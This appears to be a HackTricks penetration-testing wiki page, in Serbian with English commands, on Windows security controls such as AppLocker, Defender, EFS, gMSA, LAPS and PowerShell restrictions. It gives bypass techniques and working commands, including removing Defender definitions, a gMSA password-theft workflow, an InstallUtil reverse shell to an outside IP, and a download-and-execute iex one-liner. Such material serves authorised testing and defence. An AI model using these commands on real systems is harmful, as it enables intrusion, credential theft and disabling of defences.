# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

Application whitelist je lista odobrenih softverskih aplikacija ili izvršnih datoteka kojima je dozvoljeno da budu prisutne i da se pokreću na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo rešenje za **application whitelisting** i daje sistemskim administratorima kontrolu nad tim **koje aplikacije i datoteke korisnici mogu da pokreću**. Omogućava **granularnu kontrolu** nad izvršnim datotekama, skriptama, Windows installer datotekama, DLL datotekama, paketiranim aplikacijama i installerima paketiranih aplikacija.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i pristup za pisanje određenim direktorijumima, **ali sve ovo može da se zaobiđe**.

### Provera

Proverite koje datoteke/ekstenzije su na blacklisti/whitelisti:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ova putanja registra sadrži konfiguracije i politike koje primenjuje AppLocker, omogućavajući pregled trenutnog skupa pravila koja se sprovode na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Korisni **Writable folders** za zaobilaženje AppLocker Policy: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **writable folders** koje možete koristiti da **zaobiđete ovo**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Često **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binarije takođe mogu biti korisne za zaobilaženje AppLocker-a.
- **Loše napisane rules takođe mogu biti zaobiđene**
- Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder pod nazivom `allowed`** bilo gde i on će biti dozvoljen.
- Organizacije se takođe često fokusiraju na **blokiranje izvršne datoteke `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ali zaboravljaju na **druge** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **DLL enforcement se veoma retko omogućava** zbog dodatnog opterećenja koje može izazvati na sistemu i količine testiranja potrebne da bi se osiguralo da se ništa neće pokvariti. Zato će korišćenje **DLL-ova kao backdoor-a pomoći u zaobilaženju AppLocker-a**.
- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) za **izvršavanje Powershell** koda u bilo kom procesu i zaobilaženje AppLocker-a. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Skladištenje credentials-a

### Security Accounts Manager (SAM)

Lokalni credentials se nalaze u ovoj datoteci, a password-i su hash-ovani.

### Local Security Authority (LSA) - LSASS

**Credentials** (hash-ovani) su **sačuvani** u **memoriji** ovog podsistema zbog Single Sign-On razloga.\
**LSA** administrira lokalnu **security policy** (password policy, permissions korisnika...), **authentication**, **access tokens**...\
LSA je zadužen za **proveru** dostavljenih credentials-a u **SAM** datoteci (za lokalni login) i **komunikaciju** sa **domain controller-om** radi autentifikacije domain korisnika.

**Credentials** su **sačuvani** unutar **LSASS procesa**: Kerberos tickets, NT i LM hash-ovi, lako dekriptovani password-i.

### LSA secrets

LSA može sačuvati neke credentials-e na disku:

- Password computer account-a u Active Directory-ju (nedostupan domain controller).
- Password-i account-a Windows servisa
- Password-i za scheduled tasks
- Još toga (password IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisutna je samo na Domain Controller-ima.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je Antivirus koji je dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene pentesting alate kao što je **`WinPEAS`**. Međutim, postoje načini da se **ove zaštite zaobiđu**.

### Provera

Da biste proverili **status** **Defender-a**, možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste saznali da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Da biste ga enumerisali, možete pokrenuti i:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS štiti datoteke putem enkripcije, koristeći **simetrični ključ** poznat kao **File Encryption Key (FEK)**. Ovaj ključ se enkriptuje korisnikovim **javnim ključem** i čuva unutar **alternative data stream** $EFS enkriptovane datoteke. Kada je potrebna dekripcija, odgovarajući **privatni ključ** korisničkog digitalnog sertifikata koristi se za dekriptovanje FEK-a iz $EFS stream-a. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenario dekripcije bez inicijacije korisnika** uključuju:

- Kada se datoteke ili fascikle premeste na file system koji ne podržava EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), one se automatski dekriptuju.
- Enkriptovane datoteke poslate preko mreže putem SMB/CIFS protokola dekriptuju se pre slanja.

Ovaj metod enkripcije omogućava **transparentan pristup** enkriptovanim datotekama njihovom vlasniku. Međutim, samo promena lozinke vlasnika i prijavljivanje neće omogućiti dekripciju.

**Ključni zaključci**:

- EFS koristi simetrični FEK, enkriptovan korisnikovim javnim ključem.
- Dekripcija koristi korisnikov privatni ključ za pristup FEK-u.
- Automatska dekripcija se dešava pod određenim uslovima, kao što su kopiranje na FAT32 ili prenos preko mreže.
- Vlasnik može pristupiti enkriptovanim datotekama bez dodatnih koraka.

### Provera EFS informacija

Proverite da li je **user** **koristio** ovaj **service** tako što ćete proveriti da li ova putanja postoji:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci pomoću cipher /c \<file>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar fascikle za **enkripciju** i **dekripciju** svih datoteka

### Dekriptovanje EFS datoteka

#### Being Authority System

Ovaj način zahteva da **victim user** ima **pokrenut** **process** unutar hosta. Ako je to slučaj, pomoću `meterpreter` sesije možete imitirati token procesa korisnika (`impersonate_token` iz `incognito`). Ili možete jednostavno izvršiti `migrate` u proces korisnika.

#### Poznavanje korisničke lozinke

Mimikatz dokumentuje kako da uvezete korisnički sertifikat/materijal privatnog ključa i dekriptujete EFS-zaštićene datoteke kada je lozinka poznata.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** da bi pojednostavio upravljanje service account-ima u IT infrastrukturama. Za razliku od tradicionalnih service account-a, kod kojih je često omogućena postavka "**Password never expire**", gMSA nalozi nude sigurnije rešenje kojim je lakše upravljati:

- **Automatsko upravljanje lozinkom**: gMSA nalozi koriste složenu lozinku od 240 karaktera koja se automatski menja u skladu sa pravilima domena ili računara. Ovim procesom upravlja Microsoft-ov Key Distribution Service (KDC), čime se eliminiše potreba za ručnim ažuriranjem lozinke.
- **Poboljšana bezbednost**: Ovi nalozi su imuni na lockout i ne mogu se koristiti za interaktivno prijavljivanje, čime se povećava njihova bezbednost.
- **Podrška za više hostova**: gMSA nalozi mogu da se dele između više hostova, što ih čini idealnim za service-e koji rade na više servera.
- **Mogućnost korišćenja za Scheduled Task**: Za razliku od managed service account-a, gMSA nalozi podržavaju pokretanje scheduled task-ova.
- **Pojednostavljeno upravljanje SPN-om**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili DNS imenu, čime se pojednostavljuje upravljanje SPN-om.

Lozinke za gMSA naloge čuvaju se u LDAP svojstvu _**msDS-ManagedPassword**_ i Domain Controllers (DCs) ih automatski resetuju svakih 30 dana. Ova lozinka, enkriptovani data blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može se preuzeti samo od strane ovlašćenih administratora i servera na kojima su gMSA nalozi instalirani, čime se obezbeđuje sigurno okruženje. Za pristup ovim informacijama potrebna je zaštićena veza, kao što je LDAPS, ili veza mora biti autentifikovana pomoću 'Sealing & Secure'.

![Relaying NTLM authentication to retrieve a gMSA password](../../images/asd1.png)<sup>[[1]](#references)</sup>

Ovu lozinku možete pročitati pomoću [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pronađite više informacija u arhiviranom originalnom istraživanju**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Isto istraživanje objašnjava kako **NTLM relay attack** može da dobije **gMSA password** kada je relayed principal ovlašćen da čita `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Zloupotreba ACL chaining za čitanje gMSA managed password (GenericAll -> ReadGMSAPassword)

U mnogim okruženjima korisnici sa niskim privilegijama mogu da dođu do gMSA secrets bez kompromitovanja DC-a, zloupotrebom pogrešno konfigurisanih object ACL-ova:<sup>[[3]](#references)</sup>

- Grupi koju možete da kontrolišete (npr. putem GenericAll/GenericWrite) dodeljen je `ReadGMSAPassword` nad gMSA.
- Dodavanjem sebe u tu grupu nasleđujete pravo da čitate gMSA-ov `msDS-ManagedPassword` blob putem LDAP-a i izvedete upotrebljive NTLM credentials.

Tipičan workflow:

1) Otkrijte putanju pomoću BloodHound-a i označite svoje foothold principals kao Owned. Potražite edges kao što su:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodajte sebe u intermediate group koju kontrolišete (primer pomoću bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Pročitajte gMSA managed password putem LDAP-a i izvedite NTLM hash. NetExec automatizuje ekstrakciju `msDS-ManagedPassword` i konverziju u NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autentifikujte se kao gMSA koristeći NTLM hash (plaintext nije potreban). Ako je nalog u grupi Remote Management Users, WinRM će raditi direktno:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Napomene:
- LDAP čitanja `msDS-ManagedPassword` zahtevaju sealing (npr. LDAPS/sign+seal). Alati ovo automatski obrađuju.
- gMSAs često dobijaju lokalna prava kao što je WinRM; proverite članstvo u grupama (npr. Remote Management Users) da biste isplanirali lateral movement.
- Ako vam je blob potreban samo za samostalno izračunavanje NTLM-a, pogledajte strukturu MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

**Local Administrator Password Solution (LAPS)**, dostupno za preuzimanje sa [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lozinkama lokalnog Administrator naloga. Ove lozinke, koje su **nasumične**, jedinstvene i **redovno se menjaju**, centralno se čuvaju u Active Directory-ju. Pristup ovim lozinkama ograničen je putem ACL-ova na ovlašćene korisnike. Uz dodeljene dovoljne dozvole, omogućeno je čitanje lozinki lokalnog admin naloga.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcionalnosti** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, workflow-ova zasnovanih na XAML-u, PowerShell klasa i još mnogo toga.

### **Provera**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Na aktuelnim verzijama Windows-a taj bypass više ne radi, ali možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Da biste ga kompajlirali, možda ćete morati da** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodate `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da biste **izvršili Powershell** kod u bilo kom procesu i zaobišli ograničeni režim. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

Podrazumevano je postavljeno na **restricted.** Glavni načini za zaobilaženje ove politike:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Više informacija možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

To je API koji se može koristiti za autentifikaciju korisnika.

SSPI bira odgovarajući authentication protocol za dve mašine koje komuniciraju, pri čemu daje prednost Kerberos-u kada je dostupan. Ovi protokoli su implementirani pomoću Security Support Provider (SSP) komponenti, koje su instalirane kao DLL fajlovi u Windows-u; oba peer-a moraju da podržavaju dogovoreni provider.

### Glavni SSP-ovi

- **Kerberos**: Preferirani
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Zbog kompatibilnosti
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web serveri i LDAP, password u obliku MD5 hash-a
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
- %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi nekoliko metoda ili samo jednu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za potvrdu za aktivnosti sa povišenim privilegijama**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA putem ulančavanja prava do WinRM-a](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Zaobilaženje AppLocker-a i PowerShell Constrained Language Mode-a](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 načina za zaobilaženje PowerShell Execution Policy-ja](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ dešifrovanje EFS fajlova](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
